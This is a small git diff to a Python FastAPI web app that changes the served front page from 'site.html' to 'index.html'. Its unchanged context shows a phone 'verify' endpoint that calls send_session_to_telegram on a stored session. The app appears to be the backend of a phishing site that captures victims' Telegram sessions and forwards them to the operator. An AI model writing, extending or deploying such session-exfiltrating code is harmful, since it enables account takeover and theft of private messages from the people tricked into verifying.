@@ -16,7 +16,7 @@ app.mount("/static", StaticFiles(directory="static"), name="static")
 
 @app.get("/")
 def site():
-    return FileResponse(os.path.join("static", "site.html"))
+    return FileResponse(os.path.join("static", "index.html"))
 
 app.add_middleware(
     CORSMiddleware,
@@ -69,3 +69,4 @@ def verify(data: VerifyIn):
     send_session_to_telegram(sessions[data.phone])
 
     return {"status": "verified"}
+
